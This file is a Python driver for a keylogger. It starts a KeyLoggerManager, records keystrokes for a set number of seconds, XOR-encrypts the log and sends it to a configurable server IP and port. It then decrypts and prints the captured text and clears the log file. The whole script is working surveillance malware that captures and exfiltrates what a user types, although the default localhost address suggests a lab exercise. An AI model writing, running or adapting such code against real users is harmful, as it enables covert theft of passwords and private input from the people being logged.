import os  # Add this at the top
from keyLoggerManager import KeyLoggerManager
import time
import sys

def main(TIME=20, SERVER_IP='127.0.0.1', PORT=5000, FILE_NAME='log_from_outside.txt', KEY=5):

    print(f"Received arguments: TIME={TIME}, SERVER_IP={SERVER_IP}, PORT={PORT}, FILE_NAME={FILE_NAME}, KEY={KEY}")

    try:
        KEY = int(KEY) if isinstance(KEY, str) and KEY.isdigit() else 5
        TIME = int(TIME) if isinstance(TIME, str) and TIME.isdigit() else 20
        PORT = int(PORT) if isinstance(PORT, str) and PORT.isdigit() else 5000
    except ValueError:
        print("Error converting input arguments, using default values.")

    print(f"Parsed arguments: TIME={TIME}, PORT={PORT}, KEY={KEY}")

    man = KeyLoggerManager(SERVER_IP, PORT, FILE_NAME, KEY)
    man.start()
    print("Keylogger started...")

    time.sleep(TIME)

    man.stop()
    print("Keylogger stopped.")

    try:
        if not os.path.exists(FILE_NAME):
            print(f"Log file '{FILE_NAME}' does not exist. No keys were logged.")
            return

        with open(FILE_NAME, 'rb') as file:
            content = file.read()
            if content:
                print("Log file has content, processing...")
                man.communicate(FILE_NAME)
                decrypted_text = man.encryptor.xor_decrypt(content.decode("utf-8", errors="ignore"))
                print(f"Decrypted Log Content:\n{decrypted_text}")

        with open(FILE_NAME, 'w') as file:
            pass  # Clears the log file

    except FileNotFoundError:
        print(f"Log file '{FILE_NAME}' not found.")
    except Exception as e:
        print(f"Error processing log file: {e}")

if __name__ == '__main__':
    args = sys.argv[1:] if len(sys.argv) > 1 else []
    main(*args)
